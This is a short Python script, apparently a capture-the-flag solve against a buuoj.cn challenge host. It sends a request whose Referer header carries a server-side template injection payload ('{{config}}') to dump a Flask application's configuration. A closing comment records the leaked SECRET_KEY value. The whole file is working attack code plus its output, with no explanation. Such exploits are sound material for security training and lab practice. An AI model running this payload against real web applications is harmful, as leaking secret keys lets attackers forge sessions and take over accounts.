import requests
import html


base_url = 'http://cd4e64b9-d46d-49e1-8946-c08082769e98.node3.buuoj.cn'
headers = {'Referer': base_url + '/{{config}}'}
res = requests.get(base_url + '/hoge', headers=headers)
print(html.unescape(res.text))

# 'SECRET_KEY': b'\xe1\xb2\xffz\x88*$\x9eWu]B+\xf5\x905'
